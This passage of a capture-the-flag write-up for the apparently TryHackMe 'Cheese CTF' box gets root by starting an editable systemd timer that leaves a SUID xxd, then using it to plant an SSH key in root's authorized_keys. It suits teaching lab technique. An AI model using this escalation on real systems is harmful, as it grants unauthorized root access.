⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


THM{9[removed]a}
```

## Privilege Escalation root

I continued by running `sudo -l` and got the following output:
```bash
comte@cheesectf:~$ sudo -l
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

The user comte was allowed to start and reload one configuration file for systemd. I tried to start the `exploit.timer` unit and received the following error:
```bash
comte@cheesectf:~$ sudo /bin/systemctl start exploit.timer
Failed to start exploit.timer: Unit exploit.timer has a bad unit file setting.
See system logs and 'systemctl status exploit.timer' for details.
```

There seemed to be an issue with the configuration. The `OnBootSec` value wasn't set, which likley caused the error.
```bash
comte@cheesectf:~$ cat /etc/systemd/system/exploit.timer 
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
```

Since the `OnBootSec` required a value, I choose 3 seconds:
```bash
OnBootSec=3s
```

After changing the values I was able to start the timer-unit: 
```bash
comte@cheesectf:~$ sudo /bin/systemctl daemon-reload
comte@cheesectf:~$ sudo /bin/systemctl start exploit.timer
comte@cheesectf:~$ systemctl status exploit.timer
● exploit.timer - Exploit Timer
     Loaded: loaded (/etc/systemd/system/exploit.timer; disabled; vendor preset: enabled)
     Active: active (elapsed) since Tue 2025-03-11 15:59:25 UTC; 3s ago
    Trigger: n/a
   Triggers: ● exploit.service
```

Great! The output showed that it triggered the `exploit.service`. Upon analyzing the file, I found the following command, which was executed when `exploit.timer` ran:
```bash
comte@cheesectf:~$ cat /etc/systemd/system/exploit.service 
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

It created an `xxd` binary with the SUID bit set. After reseraching <a href="https://gtfobins.github.io/gtfobins/xxd/#file-write">GTFObins</a>, I found a way to exploit this and write my previously created SSH key to root's authorized keys. After execution, I connected as root via SSH and successfully retrieved the root flag:
```bash
comte@cheesectf:~$ echo 'ssh-ed25519 3NzaAAAC3NzaC1lZ[...]khQaAAAC3Nzkqh9r kali@kali' | xxd | /opt/xxd -r - /root/.ssh/authorized_keys

kali@kali:~/$ ssh -i id_rsa root@10.10.108.121

root@cheesectf:~# cat root.txt
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
 \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|


THM{d[removed]c}
```

solved! :)